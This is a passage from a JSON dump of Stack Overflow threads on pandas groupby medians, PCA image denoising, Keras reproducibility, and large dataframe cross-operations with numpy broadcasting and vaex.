"https://stackoverflow.com/users/12091446/jack-hanson"}, "edited": false, "score": 0, "creation_date": 1571864759, "post_id": 58530882, "comment_id": 103385775, "body": "Have you looked at the docs for groupby in pandas? <a href=\"https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.groupby.html\" rel=\"nofollow noreferrer\">pandas.pydata.org/pandas-docs/stable/reference/api/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 2389, "user_id": 7348030, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7PmbNFJwfPc/AAAAAAAAAAI/AAAAAAAAAJE/5lDuTFQtNpQ/photo.jpg?sz=128", "display_name": "Florian Bernard", "link": "https://stackoverflow.com/users/7348030/florian-bernard"}, "reply_to_user": {"reputation": 493, "user_id": 11972802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/78d49f97690bc27ab2296909c3b53d40?s=128&d=identicon&r=PG&f=1", "display_name": "leena", "link": "https://stackoverflow.com/users/11972802/leena"}, "edited": false, "score": 0, "creation_date": 1572075376, "post_id": 58531112, "comment_id": 103455377, "body": "@leena What is a median of categorical data?"}, {"owner": {"reputation": 493, "user_id": 11972802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/78d49f97690bc27ab2296909c3b53d40?s=128&d=identicon&r=PG&f=1", "display_name": "leena", "link": "https://stackoverflow.com/users/11972802/leena"}, "edited": false, "score": 0, "creation_date": 1572120067, "post_id": 58531112, "comment_id": 103464730, "body": "for example, like the columns <code>suburb</code> and <code>type</code>"}], "tags": [], "owner": {"reputation": 2389, "user_id": 7348030, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7PmbNFJwfPc/AAAAAAAAAAI/AAAAAAAAAJE/5lDuTFQtNpQ/photo.jpg?sz=128", "display_name": "Florian Bernard", "link": "https://stackoverflow.com/users/7348030/florian-bernard"}, "is_accepted": true, "score": 0, "last_activity_date": 1571865486, "creation_date": 1571865486, "answer_id": 58531112, "question_id": 58530882, "link": "https://stackoverflow.com/questions/58530882/group-by-in-pandas-to-find-median/58531112#58531112", "title": "Group by in Pandas to find Median", "body": "<p>Like this</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>def over_price(elements):\n    median = np.median(elements)\n    return elements &gt; median \n\nhouse[\"OverPrice\"] = house.groupby([\"subrub\",\"rooms\",\"bathroom\",\"type\",\"car\",\"age\"])[\"price\"].transform(over_price)\n</code></pre>\n"}], "owner": {"reputation": 493, "user_id": 11972802, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/78d49f97690bc27ab2296909c3b53d40?s=128&d=identicon&r=PG&f=1", "display_name": "leena", "link": "https://stackoverflow.com/users/11972802/leena"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 58531112, "answer_count": 1, "score": 0, "last_activity_date": 1571865486, "creation_date": 1571864181, "question_id": 58530882, "link": "https://stackoverflow.com/questions/58530882/group-by-in-pandas-to-find-median", "title": "Group by in Pandas to find Median", "body": "<p>I have a properties dataset. I would like to know the median price according to several attributes as follows:\n<code>suburb</code>,<code>rooms</code>,<code>bathrooms</code>,<code>type</code>,<code>car</code>,<code>age</code>. Then I want to add a new boolean column to state if the property is overpriced or not. </p>\n\n<p>sample of my dataframe(the original dataframe has 180 suburbs):</p>\n\n<pre><code>house=pd.DataFrame({'subrub':['BALWYN NORTH','ARMADALE','ARMADALE','PASCOE VALE'],\n                 'price':[1350000.0,800000.0,1250000.0,680000.0],\n                'rooms':[3,4,7,2],\n                'bathroom':[1.0,2.0,4.0,1.0],\n                'type':['h','t','t','u'],\n                'car':['2.0','1.0','4.0','1.0'],\n                'age':[59.0,69.0,12.0,14.0]})\n</code></pre>\n\n<p>So far I have grouped by suburbs. I know I can use <code>median</code> to find the median, but I am not sure how to approach the other attributes. Any tip would be helpful. Thank you,</p>\n"}, {"tags": ["python", "pca", "noise-reduction"], "answers": [{"comments": [{"owner": {"reputation": 567, "user_id": 10617194, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2208ed559c9794a0fcc36e7fe4cd9289?s=128&d=identicon&r=PG&f=1", "display_name": "moli", "link": "https://stackoverflow.com/users/10617194/moli"}, "edited": false, "score": 0, "creation_date": 1571866064, "post_id": 58531196, "comment_id": 103386205, "body": "Is there a way to see the eigenvectors in my projected image? Should it be done that before or after doing inverse_transform?"}, {"owner": {"reputation": 611, "user_id": 6418218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3119eae74d7c09367a07a5092c7feaec?s=128&d=identicon&r=PG&f=1", "display_name": "Nebiyou Yismaw", "link": "https://stackoverflow.com/users/6418218/nebiyou-yismaw"}, "reply_to_user": {"reputation": 567, "user_id": 10617194, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2208ed559c9794a0fcc36e7fe4cd9289?s=128&d=identicon&r=PG&f=1", "display_name": "moli", "link": "https://stackoverflow.com/users/10617194/moli"}, "edited": false, "score": 1, "creation_date": 1571867186, "post_id": 58531196, "comment_id": 103386554, "body": "You can reshape the eigenvectors into your image size (h,w) and display them, which are called eigenfaces in the case of face detection. But these images will not look like natural images. One more thing you can do is do the inverse transform with only the eigenvector of interest and see how much of the variance is explained or see the reconstruction error."}, {"owner": {"reputation": 567, "user_id": 10617194, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2208ed559c9794a0fcc36e7fe4cd9289?s=128&d=identicon&r=PG&f=1", "display_name": "moli", "link": "https://stackoverflow.com/users/10617194/moli"}, "edited": false, "score": 0, "creation_date": 1571931476, "post_id": 58531196, "comment_id": 103410810, "body": "I&#39;m getting a line instead of an image when I do inverse_transform. What I did is I added your line of code at the end of mine as stated in the question.Then display image with imshow(denoised_image)"}, {"owner": {"reputation": 611, "user_id": 6418218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3119eae74d7c09367a07a5092c7feaec?s=128&d=identicon&r=PG&f=1", "display_name": "Nebiyou Yismaw", "link": "https://stackoverflow.com/users/6418218/nebiyou-yismaw"}, "reply_to_user": {"reputation": 567, "user_id": 10617194, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2208ed559c9794a0fcc36e7fe4cd9289?s=128&d=identicon&r=PG&f=1", "display_name": "moli", "link": "https://stackoverflow.com/users/10617194/moli"}, "edited": false, "score": 1, "creation_date": 1571932089, "post_id": 58531196, "comment_id": 103411102, "body": "what do you get when you display <code>patches_reshaped </code>? You are essentially reconstructing this data."}], "tags": [], "owner": {"reputation": 611, "user_id": 6418218, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3119eae74d7c09367a07a5092c7feaec?s=128&d=identicon&r=PG&f=1", "display_name": "Nebiyou Yismaw", "link": "https://stackoverflow.com/users/6418218/nebiyou-yismaw"}, "is_accepted": true, "score": 1, "last_activity_date": 1571935061, "last_edit_date": 1571935061, "creation_date": 1571865914, "answer_id": 58531196, "question_id": 58530846, "link": "https://stackoverflow.com/questions/58530846/how-to-apply-pca-to-an-image/58531196#58531196", "title": "How to apply PCA to an image", "body": "<p>In order to see your de-noised image, you need to convert your data which is represented in some low-dimension using the principal components back to the original space. To do that you can use the <code>inverse_transform()</code> function. As you can see from the documentation <a href=\"https://scikit-learn.org/stable/modules/generated/sklearn.decomposition.PCA.html#sklearn.decomposition.PCA.inverse_transform\" rel=\"nofollow noreferrer\">here</a>, this function will accept the projected data and return an array like the original image. So you can do something like,</p>\n\n<pre><code>denoised_image = pca.inverse_transform(projected)\n# then view denoised_image\n</code></pre>\n\n<p>Edit:</p>\n\n<p>Here are some of the issues to look in to:</p>\n\n<ol>\n<li>You have <code>53824</code> patches from your original image with sizes <code>(25,25)</code>. In order to reshape you data and pass it to PCA, as you can see from the documentation <a href=\"https://scikit-learn.org/stable/modules/generated/sklearn.decomposition.PCA.html#sklearn.decomposition.PCA.fit_transform\" rel=\"nofollow noreferrer\">here</a>, you need to pass an array of size <code>(n_samples, n_features)</code>. Your number of samples is 53824. So patches reshaped should be:</li>\n</ol>\n\n<pre><code>patches_reshaped = patches.reshape(patches.shape[0],-1)\n# this should return a (53824, 625) shaped data\n</code></pre>\n\n<ol start=\"2\">\n<li>Now you use this reshaped data and transform it using PCA and inverse transform to get the data in your original domain. After doing that, your <code>denoised_image</code> is a set of reconstructed patches. You will need to combine these patches to get an image using the function <code>image.reconstruct_from_patches_2d</code> <a href=\"https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.image.reconstruct_from_patches_2d.html\" rel=\"nofollow noreferrer\">here</a> is the documentation. So you can do something like, </li>\n</ol>\n\n<pre><code>denoised_image = image.reconstruct_from_patches_2d(denoised_image.reshape(-1,25,25), grayscale_image.shape)\n</code></pre>\n\n<p>Now you can view the <code>denoised_image</code>, which should look like <code>grayscale_image</code>. </p>\n"}], "owner": {"reputation": 567, "user_id": 10617194, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2208ed559c9794a0fcc36e7fe4cd9289?s=128&d=identicon&r=PG&f=1", "display_name": "moli", "link": "https://stackoverflow.com/users/10617194/moli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 950, "favorite_count": 0, "accepted_answer_id": 58531196, "answer_count": 1, "score": 0, "last_activity_date": 1573151387, "creation_date": 1571863981, "last_edit_date": 1592644375, "question_id": 58530846, "link": "https://stackoverflow.com/questions/58530846/how-to-apply-pca-to-an-image", "title": "How to apply PCA to an image", "body": "<p>I have a graycale noisy image. I want to apply PCA for noise reduction and see the output after the application.</p>\n<p>Here's what I tried to do:</p>\n<p><strong>[in]:</strong></p>\n<pre class=\"lang-py prettyprint-override\"><code>\nfrom sklearn.datasets import load_sample_image\nfrom sklearn.feature_extraction import image\nfrom sklearn.decomposition import PCA\n# Create patches of size 25 by 25 and create a matrix from all patches\npatches = image.extract_patches_2d(grayscale_image, (25, 25), random_state = 42)\nprint(patches.shape)\n# reshape patches because I got an error when applying fit_transform(ValueError: FoundValueError: Found array with dim 3. Estimator expected &lt;= 2.)\npatches_reshaped = patches.reshape(2,-1)\n#apply PCA\npca = PCA()\nprojected = pca.fit_transform(patches_reshaped.data)\ndenoised_image = pca.inverse_transform(projected)\nimshow(denoised_image)\n</code></pre>\n<p><strong>[out]:</strong></p>\n<p><a href=\"https://i.stack.imgur.com/HcCiS.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/HcCiS.png\" alt=\"pca_result\" /></a><br />\n<sub>(source: <a href=\"https://cdn1.imggmi.com/uploads/2019/10/24/0ab3519c5db3ae89a448fe591febe088-full.png\" rel=\"nofollow noreferrer\">imggmi.com</a>)</sub></p>\n<p>I get an array as a result. How to see the de-noised image?</p>\n"}, {"tags": ["python", "machine-learning", "keras", "deep-learning"], "comments": [{"owner": {"reputation": 1040, "user_id": 11767140, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Tbfr3YlhoOs/AAAAAAAAAAI/AAAAAAAAAWo/4_25j9xubwc/photo.jpg?sz=128", "display_name": "David Garc&#237;a Bodego", "link": "https://stackoverflow.com/users/11767140/david-garc%c3%ada-bodego"}, "edited": false, "score": 0, "creation_date": 1571891784, "post_id": 58530832, "comment_id": 103391396, "body": "Welcome to SO! When you place a question try to add a minimum content: input sample, expected output sample, what did you try, research and where are you stuck. What did you try? Show us..."}], "answers": [{"comments": [{"owner": {"reputation": 1429, "user_id": 5800182, "user_type": "registered", "accept_rate": 11, "profile_image": "https://www.gravatar.com/avatar/166187032829caf350735f4d051c04ce?s=128&d=identicon&r=PG&f=1", "display_name": "PabloDK", "link": "https://stackoverflow.com/users/5800182/pablodk"}, "edited": false, "score": 0, "creation_date": 1571865205, "post_id": 58530950, "comment_id": 103385933, "body": "Thank you my friend. Unfortunately I have read and tried this out already and it didn&#39;t change anything."}, {"owner": {"reputation": 759, "user_id": 7024006, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85d649e4a76ebcaa634ff2e79adc0d3c?s=128&d=identicon&r=PG&f=1", "display_name": "ad2004", "link": "https://stackoverflow.com/users/7024006/ad2004"}, "reply_to_user": {"reputation": 1429, "user_id": 5800182, "user_type": "registered", "accept_rate": 11, "profile_image": "https://www.gravatar.com/avatar/166187032829caf350735f4d051c04ce?s=128&d=identicon&r=PG&f=1", "display_name": "PabloDK", "link": "https://stackoverflow.com/users/5800182/pablodk"}, "edited": false, "score": 0, "creation_date": 1571891944, "post_id": 58530950, "comment_id": 103391440, "body": "@PabloDK  In that case, it might be useful to convince yourself that you can actually obtain reproducible results within your environment using a very simple network like one of the Keras &quot;getting started&quot; examples (<a href=\"https://keras.io/getting-started/sequential-model-guide/\" rel=\"nofollow noreferrer\">keras.io/getting-started/sequential-model-guide</a>).  That might suggest possible directions to explore for your Capsule Network trouble.  I hope this helps."}, {"owner": {"reputation": 1429, "user_id": 5800182, "user_type": "registered", "accept_rate": 11, "profile_image": "https://www.gravatar.com/avatar/166187032829caf350735f4d051c04ce?s=128&d=identicon&r=PG&f=1", "display_name": "PabloDK", "link": "https://stackoverflow.com/users/5800182/pablodk"}, "edited": false, "score": 0, "creation_date": 1571914229, "post_id": 58530950, "comment_id": 103401362, "body": "I have tried this as well and when running on the CPU it produces the same results but only in conjunction with the SGD optimizer. If I change the optimizer to ADAM or shift from CPU to GPU then the results varies a lot again :-( Is this really the reality and the standard when playing around with stuff like this? It seems to me like such a basic issue (something which all developers would run in to) - so again, it seems crazy no better options exists (for making gpu + adam possible in regards to 100% reproducible)?"}, {"owner": {"reputation": 759, "user_id": 7024006, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85d649e4a76ebcaa634ff2e79adc0d3c?s=128&d=identicon&r=PG&f=1", "display_name": "ad2004", "link": "https://stackoverflow.com/users/7024006/ad2004"}, "reply_to_user": {"reputation": 1429, "user_id": 5800182, "user_type": "registered", "accept_rate": 11, "profile_image": "https://www.gravatar.com/avatar/166187032829caf350735f4d051c04ce?s=128&d=identicon&r=PG&f=1", "display_name": "PabloDK", "link": "https://stackoverflow.com/users/5800182/pablodk"}, "edited": false, "score": 0, "creation_date": 1571934323, "post_id": 58530950, "comment_id": 103412129, "body": "Another suggestion is to use Keras with Tensorflow 2.0 in Google Colab.  The following question has some example code in the answer section that seems to behave well (at least with a CPU): <a href=\"https://stackoverflow.com/a/58310632/7024006\">stackoverflow.com/a/58310632/7024006</a>  Again, it might be useful to start with a simple network, substitute SGD and then Adam etc. to validate the environment.  At least if there is some issue with Keras/Tensorflow, it will be with a more recent implementation.  I hope this helps."}], "tags": [], "owner": {"reputation": 759, "user_id": 7024006, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/85d649e4a76ebcaa634ff2e79adc0d3c?s=128&d=identicon&r=PG&f=1", "display_name": "ad2004", "link": "https://stackoverflow.com/users/7024006/ad2004"}, "is_accepted": false, "score": 1, "last_activity_date": 1571867813, "last_edit_date": 1571867813, "creation_date": 1571864619, "answer_id": 58530950, "question_id": 58530832, "link": "https://stackoverflow.com/questions/58530832/capsule-network-and-reproducibly/58530950#58530950", "title": "Capsule Network and reproducibly", "body": "<p>The answer to this is long and involved. There's <a href=\"https://keras.io/getting-started/faq/#how-can-i-obtain-reproducible-results-using-keras-during-development\" rel=\"nofollow noreferrer\">a blog post that goes into much more detail than I can here</a>, but I'll try to capture the high level points.</p>\n\n<ol>\n<li>Set the <code>PYTHONHASHSEED</code> environment variable to <code>0</code> <em>before</em> running your python program.</li>\n<li>If you're running calculations on the GPU, that can result in non-reproducible results due to float-rounding.  You can disable it and run all operations on the CPU by setting the <code>CUDA_VISIBLE_DEVICES</code> environment variable to an empty string in the same manner as before.</li>\n</ol>\n\n<pre><code>CUDA_VISIBLE_DEVICES=\"\" PYTHONHASHSEED=0 python your_program.py\n</code></pre>\n"}], "owner": {"reputation": 1429, "user_id": 5800182, "user_type": "registered", "accept_rate": 11, "profile_image": "https://www.gravatar.com/avatar/166187032829caf350735f4d051c04ce?s=128&d=identicon&r=PG&f=1", "display_name": "PabloDK", "link": "https://stackoverflow.com/users/5800182/pablodk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 109, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1571867813, "creation_date": 1571863900, "question_id": 58530832, "link": "https://stackoverflow.com/questions/58530832/capsule-network-and-reproducibly", "title": "Capsule Network and reproducibly", "body": "<p>I'm currently struggling when using Capsule Network (Keras version: CapsNet).</p>\n\n<p>Each time I run more than 2-5 predictions in a row (in side a loop) the results vary a lot. I have tried to change so mange things. I have changed the optimizer from ADAM to SGD as well - but I simply can't make it 100 % stable and thereby be able to reproduce a given run - once again.</p>\n\n<p>How can I make CapsNet 100% reproducible every run?</p>\n"}, {"tags": ["python", "pandas"], "comments": [{"owner": {"reputation": 22982, "user_id": 10189214, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-oTTBaX3HSZQ/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7ohHVatc4khqXgYvNrBM40bMFj71Q/mo/photo.jpg?sz=128", "display_name": "Andy L.", "link": "https://stackoverflow.com/users/10189214/andy-l"}, "edited": false, "score": 0, "creation_date": 1571865555, "post_id": 58530824, "comment_id": 103386050, "body": "your output <code>df12</code> will have ~20,000,000+ rows and 4 columns ?"}, {"owner": {"reputation": 141, "user_id": 11380913, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-I0pQiyFiwdY/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rcbaguY2kQ5Yyxay6_ultqvQVLFVg/mo/photo.jpg?sz=128", "display_name": "Roy Han", "link": "https://stackoverflow.com/users/11380913/roy-han"}, "reply_to_user": {"reputation": 22982, "user_id": 10189214, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-oTTBaX3HSZQ/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7ohHVatc4khqXgYvNrBM40bMFj71Q/mo/photo.jpg?sz=128", "display_name": "Andy L.", "link": "https://stackoverflow.com/users/10189214/andy-l"}, "edited": false, "score": 0, "creation_date": 1571865973, "post_id": 58530824, "comment_id": 103386174, "body": "In this example yes, but it was just a rough demonstration of the scale. This can be scaled back, as column &#39;A&#39; will only be matched if df2[&#39;A&#39;] = df1[&#39;A&#39;] +/- 0.5."}, {"owner": {"reputation": 22982, "user_id": 10189214, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-oTTBaX3HSZQ/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7ohHVatc4khqXgYvNrBM40bMFj71Q/mo/photo.jpg?sz=128", "display_name": "Andy L.", "link": "https://stackoverflow.com/users/10189214/andy-l"}, "edited": false, "score": 0, "creation_date": 1571866267, "post_id": 58530824, "comment_id": 103386279, "body": "I am thinking about numpy broadcasting. That&#39;s why I ask about number of rows. I am worried that ~20 million rows after the broadcasting will cause memory error. However, it depends on how big memory of your system. Give @QuangHoang&#39;s solution a try to see if your system is able to handle numpy broadcasting that big."}, {"owner": {"reputation": 114459, "user_id": 4238408, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/RWkmO.jpg?s=128&g=1", "display_name": "Quang Hoang", "link": "https://stackoverflow.com/users/4238408/quang-hoang"}, "reply_to_user": {"reputation": 22982, "user_id": 10189214, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-oTTBaX3HSZQ/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7ohHVatc4khqXgYvNrBM40bMFj71Q/mo/photo.jpg?sz=128", "display_name": "Andy L.", "link": "https://stackoverflow.com/users/10189214/andy-l"}, "edited": false, "score": 1, "creation_date": 1571928864, "post_id": 58530824, "comment_id": 103409415, "body": "@AndyL. <a href=\"https://www.google.com/search?q=20000000+%2A+4+%2A+32+bits&amp;oq=20000000+%2A+4+%2A+32+bits\" rel=\"nofollow noreferrer\">Google</a> say that is only 320 MBs. So it&#39;s not too bad."}], "answers": [{"comments": [{"owner": {"reputation": 141, "user_id": 11380913, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-I0pQiyFiwdY/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rcbaguY2kQ5Yyxay6_ultqvQVLFVg/mo/photo.jpg?sz=128", "display_name": "Roy Han", "link": "https://stackoverflow.com/users/11380913/roy-han"}, "edited": false, "score": 0, "creation_date": 1571866081, "post_id": 58531114, "comment_id": 103386211, "body": "In this example, would it support combination operations? Say df12[&#39;A&#39;] = df1[&#39;A&#39;] - df2[&#39;A&#39;] and df12[&#39;D&#39;] = df1[&#39;D&#39;] == df2[&#39;D&#39;] (Boolean)."}, {"owner": {"reputation": 114459, "user_id": 4238408, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/RWkmO.jpg?s=128&g=1", "display_name": "Quang Hoang", "link": "https://stackoverflow.com/users/4238408/quang-hoang"}, "reply_to_user": {"reputation": 141, "user_id": 11380913, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-I0pQiyFiwdY/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rcbaguY2kQ5Yyxay6_ultqvQVLFVg/mo/photo.jpg?sz=128", "display_name": "Roy Han", "link": "https://stackoverflow.com/users/11380913/roy-han"}, "edited": false, "score": 0, "creation_date": 1571866169, "post_id": 58531114, "comment_id": 103386246, "body": "No, you would need to work on the column separately."}], "tags": [], "owner": {"reputation": 114459, "user_id": 4238408, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/RWkmO.jpg?s=128&g=1", "display_name": "Quang Hoang", "link": "https://stackoverflow.com/users/4238408/quang-hoang"}, "is_accepted": true, "score": 1, "last_activity_date": 1571865489, "creation_date": 1571865489, "answer_id": 58531114, "question_id": 58530824, "link": "https://stackoverflow.com/questions/58530824/what-would-be-the-best-way-to-perform-operations-against-a-significant-number-of/58531114#58531114", "title": "What would be the best way to perform operations against a significant number of rows from one df to one row from another?", "body": "<p>Broadcasting is the way to go:</p>\n\n<pre><code>pd.DataFrame((df1.to_numpy()[:,None] - df2.to_numpy()[None,...]).reshape(-1, df1.shape[1]),\n             columns = df2.columns,\n             index = pd.MultiIndex.from_product((df1.index,df2.index))\n            )\n</code></pre>\n\n<p>Output (for <code>df1</code> the three first rows, <code>df2</code> the two first rows):</p>\n\n<pre><code>        A      B    C    D\n0 0  0.00  0.000  0.0  0.0\n  1  1.39  2.768  2.0  0.0\n1 0 -1.39 -2.768 -2.0  0.0\n  1  0.00  0.000  0.0  0.0\n2 0  2.47  1.201  3.9 -1.0\n  1  3.86  3.969  5.9 -1.0\n</code></pre>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user5680356"}, "is_accepted": false, "score": 0, "last_activity_date": 1571866447, "creation_date": 1571866447, "answer_id": 58531277, "question_id": 58530824, "link": "https://stackoverflow.com/questions/58530824/what-would-be-the-best-way-to-perform-operations-against-a-significant-number-of/58531277#58531277", "title": "What would be the best way to perform operations against a significant number of rows from one df to one row from another?", "body": "<p>I would use openpyxl</p>\n\n<p>This loop would do </p>\n\n<pre><code>for row in sheet.iter_rows(min_row=minr, min_col=starting col, max_col=finshing col, max_row=maxr):\n    for cell in row:\n        df1 = cell.value\nfor row in sheet.iter_rows(min_row=minr, min_col=starting col, max_col=finshing col, max_row=maxr):\n    for cell in row:\n        df2 = cell.value\n</code></pre>\n\n<p>from here you want do what , create new values ? put them where? the code here points on them </p>\n"}, {"tags": [], "owner": {"reputation": 1061, "user_id": 5397207, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-VaKDA8oPhVw/AAAAAAAAAAI/AAAAAAAAAmk/MuotQt0FNek/photo.jpg?sz=128", "display_name": "Maarten Breddels", "link": "https://stackoverflow.com/users/5397207/maarten-breddels"}, "is_accepted": false, "score": 0, "last_activity_date": 1576066762, "creation_date": 1576066762, "answer_id": 59285687, "question_id": 58530824, "link": "https://stackoverflow.com/questions/58530824/what-would-be-the-best-way-to-perform-operations-against-a-significant-number-of/59285687#59285687", "title": "What would be the best way to perform operations against a significant number of rows from one df to one row from another?", "body": "<p>An interesting question, that vaex can actually solve quite memory efficient (although we should be able to require practically no memory in the future).</p>\n\n<p>Let's start creating the vaex dataframes, and increase the numbers a bit, 2,000 and 200,000 rows.</p>\n\n<pre><code>import vaex\nimport numpy as np\nnames = \"ABCD\"\nN = 2000\nM = N * 100\nprint(f'{N*M:,} rows')\n400,000,000 rows\n\ndf1 = vaex.from_dict({name + '1': np.random.random(N) * 6 for name in names})\n# We add a virtual range column for joining (requires no memory)\ndf1['i1'] = vaex.vrange(0, N, dtype=np.int32)\nprint(df1)\n#      A1                   B1                   C1                   D1                  i1\n0      5.863720056164963    3.362898169138271    3.2880444660598784   0.1482153863632898  0\n1      5.873731485927979    5.669031702051764    5.696571067838359    1.0310578585207142  1\n2      4.513310303419997    4.466469647700519    5.047406986222205    3.4417402924374407  2\n3      0.43402400660624174  1.157476656465433    2.179139262842482    1.1666706679131253  3\n4      3.3698854360766526   2.203558794966768    0.39649910973621827  2.5576740079630502  4\n...    ...                  ...                  ...                  ...                 ...\n1,995  4.836227485536714    4.093067389612236    5.992282902119859    1.3549691660861871  1995\n1,996  1.1157617217838995   1.1606619796004967   3.2771620798090533   4.249631266421745   1996\n1,997  4.628846984287445    4.019449674317169    3.7307713985954947   3.7702606362049362  1997\n1,998  1.3196727531762933   2.6758762345410565   3.249315566523623    2.6501467681546123  1998\n1,999  5.013902261001965    0.07240435410582324  0.8744364486077243   2.6801177594876218  1999\n\ndf2 = vaex.from_dict({name + '2': np.random.random(M) * 6 for name in names})\ndf2['i2'] = vaex.vrange(0, M, dtype=np.int32)\nprint(df2)\n#        A2                   B2                   C2                  D2                  i2\n0        2.6928366822161234   3.227321076730826    5.944154034728931   3.3584747680090814  0\n1        4.824761575636117    2.960087600265437    3.492601702004836   1.054879207993813   1\n2        4.33510613806528     0.46883404117516103  5.632361155412736   0.436374137912523   2\n3        0.0422709543055384   2.5319705848478855   3.5596949266321216  2.5364151309685354  3\n4        2.749335843510271    3.5446979145461146   2.550223710733076   5.02069361871291    4\n...      ...                  ...                  ...                 ...                 ...\n199,995  5.32205669155252     4.321667991189379    2.1192950613326182  5.937425946574905   199995\n199,996  0.10746705113978328  4.104809740632655    0.6282195590464632  3.9603843538752974  199996\n199,997  5.74108180127652     3.5863223687990136   4.64031507831471    4.610807268734913   199997\n199,998  5.839402924722246    2.630974123991404    4.50411700551054    3.0960758923309983  199998\n199,999  1.6954091816701466   1.8054911765387567   4.300317113825266   4.900845720973579   199999\n</code></pre>\n\n<p>Now we create our 'master' vaex dataframe, that requires <em>no memory at all</em>, it's made of a virtual column and two expressions (stored as virtual columns):</p>\n\n<pre><code>df = vaex.from_arrays(i=vaex.vrange(0, N*M, dtype=np.int64))\ndf['i1'] = df.i // M  # index to df1\ndf['i2'] = df.i % M   # index to df2\nprint(df) \n#            i          i1    i2\n0            0          0     0\n1            1          0     1\n2            2          0     2\n3            3          0     3\n4            4          0     4\n...          ...        ...   ...\n399,999,995  399999995  1999  199995\n399,999,996  399999996  1999  199996\n399,999,997  399999997  1999  199997\n399,999,998  399999998  1999  199998\n399,999,999  399999999  1999  199999\n</code></pre>\n\n<p>Unfortunately vaex cannot use these integer indices as lookups for joining directly, it has to go through as hashmap. So there is room for improvement here for vaex. If vaex could do this, we could scale this idea up to trillions of rows.</p>\n\n<pre><code>print(f\"The next two joins require ~{len(df)*8*2//1024**2:,} MB of RAM\")\nThe next two joins require ~6,103 MB of RAM\n\ndf_big = df.join(df1, on='i1')\ndf_big = df_big.join(df2, on='i2')\nprint(df_big)\n#            i          i1    i2      A1                 B1                   C1                  D1                  A2                   B2                   C2                  D2\n0            0          0     0       5.863720056164963  3.362898169138271    3.2880444660598784  0.1482153863632898  2.6928366822161234   3.227321076730826    5.944154034728931   3.3584747680090814\n1            1          0     1       5.863720056164963  3.362898169138271    3.2880444660598784  0.1482153863632898  4.824761575636117    2.960087600265437    3.492601702004836   1.054879207993813\n2            2          0     2       5.863720056164963  3.362898169138271    3.2880444660598784  0.1482153863632898  4.33510613806528     0.46883404117516103  5.632361155412736   0.436374137912523\n3            3          0     3       5.863720056164963  3.362898169138271    3.2880444660598784  0.1482153863632898  0.0422709543055384   2.5319705848478855   3.5596949266321216  2.5364151309685354\n4            4          0     4       5.863720056164963  3.362898169138271    3.2880444660598784  0.1482153863632898  2.749335843510271    3.5446979145461146   2.550223710733076   5.02069361871291\n...          ...        ...   ...     ...                ...                  ...                 ...                 ...                  ...                  ...                 ...\n399,999,995  399999995  1999  199995  5.013902261001965  0.07240435410582324  0.8744364486077243  2.6801177594876218  5.32205669155252     4.321667991189379    2.1192950613326182  5.937425946574905\n399,999,996  399999996  1999  199996  5.013902261001965  0.07240435410582324  0.8744364486077243  2.6801177594876218  0.10746705113978328  4.104809740632655    0.6282195590464632  3.9603843538752974\n399,999,997  399999997  1999  199997  5.013902261001965  0.07240435410582324  0.8744364486077243  2.6801177594876218  5.74108180127652     3.5863223687990136   4.64031507831471    4.610807268734913\n399,999,998  399999998  1999  199998  5.013902261001965  0.07240435410582324  0.8744364486077243  2.6801177594876218  5.839402924722246    2.630974123991404    4.50411700551054    3.0960758923309983\n399,999,999  399999999  1999  199999  5.013902261001965  0.07240435410582324  0.8744364486077243  2.6801177594876218  1.6954091816701466   1.8054911765387567   4.300317113825266   4.900845720973579\n</code></pre>\n\n<p>Now we have our big dataframe, and we only need to do the computation, which is using virtual columns, and thus require no extra memory.</p>\n\n<pre><code># add virtual colums (which require no memory)\nfor name in names:\n    df_big[name] = df_big[name + '1'] - df_big[name + '2']\nprint(df_big[['A', 'B', 'C', 'D']])\n#            A                     B                     C                     D\n0            3.17088337394884      0.13557709240744487   -2.6561095686690526   